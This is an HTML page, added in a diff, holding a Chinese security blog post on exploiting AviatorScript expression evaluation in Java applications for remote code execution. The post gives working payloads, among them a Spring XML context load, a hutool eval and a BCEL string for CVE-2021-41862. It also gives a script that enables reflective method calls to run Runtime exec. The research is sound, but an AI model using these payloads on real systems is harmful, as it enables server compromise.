@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="背景AviatorScript 是一门高性能、轻量级寄宿于 JVM （包括 Android 平台）之上的脚本语言。因为最近刚好项目中有碰到，且网上没看到太多相关的文章和利用，所以就总结了一下，特别是碰到相关漏洞场景下的利用构造。 使用方式aviator 可以通过脚本文件的方式运行，以下以 av 结尾的脚本文件： 123## examples&#x2F;hello.avprintln(&quot;hello,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AviatorScript 脚本语言利用方式解析">
+<meta property="og:url" content="http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/">
+<meta property="og:site_name" content="wude">
+<meta property="og:description" content="背景AviatorScript 是一门高性能、轻量级寄宿于 JVM （包括 Android 平台）之上的脚本语言。因为最近刚好项目中有碰到，且网上没看到太多相关的文章和利用，所以就总结了一下，特别是碰到相关漏洞场景下的利用构造。 使用方式aviator 可以通过脚本文件的方式运行，以下以 av 结尾的脚本文件： 123## examples&#x2F;hello.avprintln(&quot;hello,">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-04-22T06:57:02.000Z">
+<meta property="article:modified_time" content="2025-04-22T07:05:22.781Z">
+<meta property="article:author" content="wude">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>AviatorScript 脚本语言利用方式解析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/04/22/codeql-%E6%94%B9%E8%BF%9B%E8%AE%A1%E5%88%92%E4%B8%80-fastjson-mybatis/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/22/workflow-%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&text=AviatorScript 脚本语言利用方式解析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&is_video=false&description=AviatorScript 脚本语言利用方式解析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AviatorScript 脚本语言利用方式解析&body=Check out this article: http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&name=AviatorScript 脚本语言利用方式解析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&t=AviatorScript 脚本语言利用方式解析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">使用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E4%B8%80%E8%88%AC%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">更一般的利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">5.</span> <span class="toc-text">reference</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        AviatorScript 脚本语言利用方式解析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">wude</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-22T06:57:02.000Z" class="dt-published" itemprop="datePublished">2025-04-22</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>AviatorScript 是一门高性能、轻量级寄宿于 JVM （包括 Android 平台）之上的脚本语言。因为最近刚好项目中有碰到，且网上没看到太多相关的文章和利用，所以就总结了一下，特别是碰到相关漏洞场景下的利用构造。</p>
+<h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><p>aviator 可以通过脚本文件的方式运行，以下以 av 结尾的脚本文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">## examples/hello.av</span><br><span class="line"></span><br><span class="line">println(&quot;hello, AviatorScript!&quot;);</span><br></pre></td></tr></table></figure>
+<p>java 运行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> AviatorEvaluator.getInstance().compileScript(<span class="string">&quot;examples/hello.av&quot;</span>);</span><br><span class="line">exp.execute();</span><br></pre></td></tr></table></figure>
+<p>还提供了 cli 程序：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">aviator hello.av</span></span><br><span class="line">Hello, AviatorScript!</span><br></pre></td></tr></table></figure>
+<p>也可以直接以字符串格式提供：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Compile a script</span></span><br><span class="line"><span class="type">Expression</span> <span class="variable">script</span> <span class="operator">=</span> AviatorEvaluator.getInstance().compile(<span class="string">&quot;println(&#x27;Hello, AviatorScript!&#x27;);&quot;</span>);</span><br><span class="line">script.execute();</span><br></pre></td></tr></table></figure>
+<p>上面的使用都是等价的，在 aviator 这里都称为 <code>编译与运行</code> 模式。还有一个 <code>解释运行</code> 模式，可以通过 AviatorEvaluator.newInstance(EvalMode)来创建一个特定执行模式的脚本引擎， EvalMode包括：</p>
+<p>● EvalMode.ASM 原有的默认的基于 asm 生成 jvm 字节码的运行模式。</p>
+<p>● EvalMode.INTERPRETER解释器模式，将生成 aviatorscript  IR 并解释执行。</p>
+<p>其中 INTERPRETER 模式是为了比如说 Android 等平台可以运行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AviatorEvaluatorInstance</span> <span class="variable">engine</span> <span class="operator">=</span> AviatorEvaluator.newInstance(EvalMode.INTERPRETER);</span><br><span class="line"><span class="type">Expression</span> <span class="variable">exp</span> <span class="operator">=</span> engine.compile(<span class="string">&quot;score &gt; 80 ? &#x27;good&#x27; : &#x27;bad&#x27;&quot;</span>);</span><br><span class="line">System.out.println(exp.execute(exp.newEnv(<span class="string">&quot;score&quot;</span>, <span class="number">100</span>)));</span><br></pre></td></tr></table></figure>
+<p>两者实际使用语法一样。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>在安全研究中，当然更关注和 java api 的交互关系，有两种，一种是类似 ScriptEngine 的方式通过 java spi 方式调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ScriptEngineManager</span> <span class="variable">sem</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"><span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> sem.getEngineByName(<span class="string">&quot;AviatorScript&quot;</span>);</span><br><span class="line"><span class="type">AviatorEvaluatorInstance</span> <span class="variable">instance</span> <span class="operator">=</span> ((AviatorScriptEngine) engine).getEngine();</span><br><span class="line"><span class="comment">// Use compatible feature set</span></span><br><span class="line">instance.setOption(Options.FEATURE_SET, Feature.getCompatibleFeatures());</span><br><span class="line"><span class="comment">// Doesn&#x27;t support if in compatible feature set mode.</span></span><br><span class="line">engine.eval(<span class="string">&quot;if(true) &#123; println(&#x27;support if&#x27;); &#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>这种模式下默认是基于反射去调用实例方法，参考：<a target="_blank" rel="noopener" href="https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#azo1K">https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2#azo1K</a></p>
+<p>这种在实际利用场景中可能会比较少见，还可以直接调用 java api，一种是通过 new 可以新建 java 对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">let</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Date();</span><br><span class="line"><span class="type">let</span> <span class="variable">year</span> <span class="operator">=</span> getYear(d);</span><br><span class="line">p(<span class="string">&quot;Year is: &quot;</span> + year);</span><br></pre></td></tr></table></figure>
+<p>代码摘自官方示例，不过在最新版 5.4.3 下报错 <code>Function not found: getYear</code>，不过还是可以初始化的，可以使用一个常见的类实现 rce：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">org</span>.springframework.context.support.ClassPathXmlApplicationContext(<span class="string">&#x27;poc.xml&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>还可以使用 use 加载类到当前空间：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use java.util.Date;</span><br><span class="line"><span class="type">let</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">p(d);</span><br></pre></td></tr></table></figure>
+<p>use 和 new 是差不多的。如果是 java.lang 包下的类，可以直接使用，不需要 use。</p>
+<p>从 5.2.1 版本开始，还可以直接通过 Class.Method(..args) 调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use java.util.Date;Date.parse(<span class="string">&#x27;1970/01/01&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p>那么可以直接使用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use cn.hutool.script.ScriptUtil;ScriptUtil.eval(\<span class="string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;calc&#x27;)\&quot;)</span></span><br></pre></td></tr></table></figure>
+<p>除此之外，<a target="_blank" rel="noopener" href="https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2">https://www.yuque.com/boyan-avfmj/aviatorscript/xbdgg2</a> 里面还介绍了其他的方式，不过很多和实际的利用场景无关，有一个 <code>JavaMethodReflectionFunctionMissing</code> 值得注意：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AviatorEvaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());</span><br><span class="line">System.out.println(AviatorEvaluator.execute(<span class="string">&quot;add(3M, 4M)&quot;</span>));</span><br></pre></td></tr></table></figure>
+<p>可以调用 非静态 方法，和上面的 use 形成互补。</p>
+<p>事实上，aviator 有一个 CVE-2021-41862，参考：<a target="_blank" rel="noopener" href="https://github.com/killme2008/aviatorscript/issues/421%E3%80%82%E9%80%9A%E8%BF%87">https://github.com/killme2008/aviatorscript/issues/421。通过</a> bcel 创建一个对象，绕过了只能静态方法的限制：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evaluator.execute(<span class="string">&quot;&#x27;a&#x27;+(c=Class.forName(\&quot;$$BCEL$$...\&quot;,true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\&quot;open /System/Applications/Calculator.app\&quot;) );&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>不过后面有作者的澄清，而且 bcel 本身限制也比较大，在高一些的 jdk 版本就不存在了，所以还是要探索以下更通用的利用(而非漏洞)。</p>
+<h2 id="更一般的利用方法"><a href="#更一般的利用方法" class="headerlink" title="更一般的利用方法"></a>更一般的利用方法</h2><p>上面作者对漏洞的回复是这样的：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">AviatorEvaluatorInstance</span> <span class="variable">evaluator</span> <span class="operator">=</span> AviatorEvaluator.newInstance();</span><br><span class="line">evaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());</span><br><span class="line">evaluator.execute(<span class="string">&quot;exec(Runtime.getRuntime(), &#x27;open /System/Applications/Calculator.app&#x27;)&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>通过使用 FunctionMissing 模式直接调用非静态方法，然而实际中可能无法控制这个模式，怎么才能使用这个模式，就是这个绕过的由来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># poc.av</span><br><span class="line"></span><br><span class="line">use com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing;</span><br><span class="line">use com.googlecode.aviator.AviatorEvaluator;</span><br><span class="line">AviatorEvaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());</span><br><span class="line">AviatorEvaluator.execute(\<span class="string">&quot;exec(Runtime.getRuntime(), &#x27;calc&#x27;)\&quot;)</span></span><br></pre></td></tr></table></figure>
+<p>直接在当前的脚本空间里将 AviatorEvaluator 修改为 FunctionMissing 模式，即可以调用非静态方法。而且比前面的各种方法稳定，不需要出网，也不需要三方依赖，只需要 aviator 依赖，这个自然是没有问题的。</p>
+<p>当然仔细看官方文档，也不只有这种解法，比如说还有一个 <code>导入实例方法</code> 的章节，大同小异，不展开了。</p>
+<h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/killme2008/aviatorscript">https://github.com/killme2008/aviatorscript</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.yuque.com/boyan-avfmj/aviatorscript/cpow90">https://www.yuque.com/boyan-avfmj/aviatorscript/cpow90</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/killme2008/aviatorscript/issues/421">https://github.com/killme2008/aviatorscript/issues/421</a></li>
+<li><a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41862">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41862</a></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">使用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">利用方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E4%B8%80%E8%88%AC%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">更一般的利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">5.</span> <span class="toc-text">reference</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&text=AviatorScript 脚本语言利用方式解析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&is_video=false&description=AviatorScript 脚本语言利用方式解析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=AviatorScript 脚本语言利用方式解析&body=Check out this article: http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&title=AviatorScript 脚本语言利用方式解析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&name=AviatorScript 脚本语言利用方式解析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/04/22/AviatorScript-%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E8%A7%A3%E6%9E%90/&t=AviatorScript 脚本语言利用方式解析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    wude
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
